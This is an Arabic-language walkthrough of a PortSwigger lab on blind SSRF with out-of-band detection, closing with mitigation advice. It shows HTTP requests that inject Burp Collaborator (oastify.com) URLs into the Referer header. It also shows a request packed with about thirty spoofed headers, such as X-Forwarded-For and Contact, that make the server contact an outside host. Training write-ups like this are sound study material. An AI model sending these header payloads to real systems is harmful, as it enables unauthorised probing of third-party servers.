# [Blind SSRF with out-of-band detection](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)

## **`الهدف`**
قم بإرسال طلب `HTTP` إلى `public Burp Collaborator server`.
## **`خطوات الحل`**
==**`ملاحظة هامة:`**== لا يمكن حل هذا اللاب إلا باستعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`.

بعد الدخول إلى اللاب سنتوجه إلى أى منتج، ونقوم بعد ذلك بالتوجه إلى `HTTP history` وتحويل الطلب إلى `Repeater`
```http
GET /product?productId=1 HTTP/2
Host: 0a650030041549b2809fe93000fd0035.web-security-academy.net
Cookie: session=Z0zNrMcZint3Gq6ZahCjZZPBu0HJQ9vc
Referer: https://0a650030041549b2809fe93000fd0035.web-security-academy.net/
```

بعد ذلك سنقوم بالتوجه إلى `Burp Collaborator` ونقوم بنسخ الرابط ونقوم بوضعه في قيمة ترويسة `Referer` ونقوم بإرسال الطلب
```http
GET /product?productId=1 HTTP/2
Host: 0a650030041549b2809fe93000fd0035.web-security-academy.net
Cookie: session=Z0zNrMcZint3Gq6ZahCjZZPBu0HJQ9vc
Referer: https://5oui1eq6waio7ibdrg7algx1ys4js9gy.oastify.com
```

وبعد ذلك سنقوم بالتوجه إلى `Burp Collaborator` ونضغط على `Poll now`  لننتهي من حل اللاب.

==**`ملاحظة هامة:`**== هذا اللاب يُمكن حله تلقائيًأ بإستخدام إضافة `Collaborator Everywhere` وبمجرد تشغيلها ووضع رابط اللاب داخل الـ `Scope` وعند فتح صفحة أى منتج سنجد أن اللاب قد تم حله لأن الإضافة قامت بإرسال الطلب التالي تلقائيًأ:
```http
GET /product?productId=1 HTTP/2
Host: 0a650030041549b2809fe93000fd0035.web-security-academy.net
Cookie: session=Z0zNrMcZint3Gq6ZahCjZZPBu0HJQ9vc
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/314.15 (KHTML, like Gecko) Chrome/31.4.1592.65 Safari/314.15 <img src="https://hte0mxvjnj5j8pve2ujz2kkik9q2er.oastify.com">
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://tvsco9xvpv7va1xq46lb4wmumlsfg4.oastify.com
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Cache-Control: no-transform
Contact: root@0stjlgu2m24278ux1dii13j1jspjd8.oastify.com
From: root@q8z916as2sksnyanh3y8htzrzi5atz.oastify.com
X-Original-URL: https://x53gyd7zzzhzk57ueavfe0wywp2kq9.oastify.com/
X-Wap-Profile: https://3ptmijr5j5154br0ygfly6g4gvmrag.oastify.com/wap.xml
Profile: https://eucxnuwgog6g9mwb3rkw3hlfl6r3fs.oastify.com/wap.xml
X-Arbitrary: https://2z2lsi14t4b4ea1z8fpk85q3quwskh.oastify.com/
X-HTTP-DestinationURL: https://ioa1hyqkik0k3qqfxve0xlfjfal99y.oastify.com/
X-Forwarded: a8jt1qac2ckcnia7hnyshdzbz252tr.oastify.com
X-Forwarded-Proto: https://ar5tkqtclc3c6it70nhs0dibi2o3cs.oastify.com/
X-Forwarded-Host: yjlhcel0d0v0y6lvsb9gs1azaqgs4h.oastify.com
X-Forwarded-For: spoofed.p0q8t52rurcrfx2m92q79srqrhxkl9.oastify.com
X-Forwarded-Server: fo7yhvqhih0h3nqcxsexxifgf7lb90.oastify.com
X-Host: c7kv0s9e1ejemk99gpxugfydy449sy.oastify.com
X-HTTP-Host-Override: d6kwzt8f0fifll8afqwvfgxex53wtki.oastify.com
Cluster-Client-IP: spoofed.g1izuw3ividigo3datryajshs8yzpne.oastify.com
True-Client-IP: spoofed.457nyk76z6h6kc71ehvme7w5ww2nubj.oastify.com
Client-IP: spoofed.6ovphmq8i8083eq3xjeox9f7fylped3.oastify.com
X-Client-IP: spoofed.u61dza8w0wiwl28rf7wcfxxvxm3dx1m.oastify.com
X-Real-IP: spoofed.i8r11yak2kkknqafhvy0hlzjza510pp.oastify.com
X-Remote-IP: spoofed.uomdhaqwiw0w32qrx7ecxxfvfmldh16.oastify.com
X-Originating-IP: spoofed.gauz3wci4imipocdjt0yjj1h187z4nt.oastify.com
X-ProxyUser-Ip: spoofed.h8q01xaj2jkjnpaehuyzhkziz9503os.oastify.com
X-Remote-Addr: spoofed.2adl3ic444m4paczjf0kj5131u7l69v.oastify.com
CF-Connecting_IP: spoofed.v0wetb2xuxcxf32s98qd9yrwrnxex2m.oastify.com
Forwarded: for=spoofed.mi85b2kocouoxukjrz84rp9n9ef5gt5.oastify.com;by=spoofed.mi85b2kocouoxukjrz84rp9n9ef5gt5.oastify.com;host=spoofed.mi85b2kocouoxukjrz84rp9n9ef5gt5.oastify.com
```
## **`ترقيع الثغرة`**
يجب عدم الوثوق المطلق في ترويسات `HTTP Headers` مثل `Referer` أو `X-Forwarded-For`، بحيث لا يتم استخدام القيم الممررة داخلها كعناوين `URL` صالحة يتم الاتصال بها تلقائياً، وفي حال كان التطبيق يعتمد على برامج أو أدوات تحليل الزيارات `Analytics` لمعالجة هذه الترويسات، يجب منع هذه الأدوات من زيارة أو جلب محتوى الروابط المدخلة بشكل تلقائي للبحث عن بيانات إضافية أو تتبع المستخدمين، بل يجب أن تقتصر وظيفتها على تسجيل البيانات كنص عادي `Plain Text` فقط.

وإذا كان الـ `Business Logic` يُحتم على السيرفر جلب محتوى من الرابط الموجود في الـ `Referer` فيجب تطبيق قائمة بيضاء `Whitelist` صارمة تحتوي فقط على النطاقات الموثوقة، مع رفض أي عناوين تشير إلى الشبكات الداخلية أو استخدام بروتوكولات غير الـ `HTTP/HTTPS` (مثل `file://` أو `gopher://`).

ويجب تطبيق سياسة تقييد الاتصالات الصادرة `Egress Filtering` على مستوى الجدار الناري `Firewall`، بحيث يتم منع سيرفر الويب من إجراء أي اتصالات صادرة `Outbound Connections` نحو شبكة الإنترنت الخارجية بشكل افتراضي تطبيقًا لمبدأ المنع الافتراضي `Default Deny`، والسماح للسيرفر فقط بالاتصال بالوجهات الخارجية الضرورية والمحددة مسبقاً عبر قائمة بيضاء صارمة `Strict Whitelist`، لمنع المهاجم من استغلال السيرفر للاتصال بخوادم خارجية يتحكم بها `OAST` لتأكيد الثغرات العمياء `Blind SSRF` أو تسريب البيانات `Out-of-band Data Exfiltration`.

ويجب عزل أي أدوات أو مكتبات طرف ثالث `Third-Party Plugins` مستخدمة في تحليل البيانات أو معالجة الروابط وتشغيلها في بيئة آمنة ومعزولة `Sandboxed Environment` بصلاحيات شبكة مقيدة، لضمان عدم قدرتها على إجراء اتصالات شبكية عشوائية سواء نحو الشبكة الداخلية للوصول إلى خدمات حساسة، أو نحو شبكة الإنترنت الخارجية بناءً على مدخلات وهمية يتم حقنها من قبل المهاجم في ترويسات الطلب.
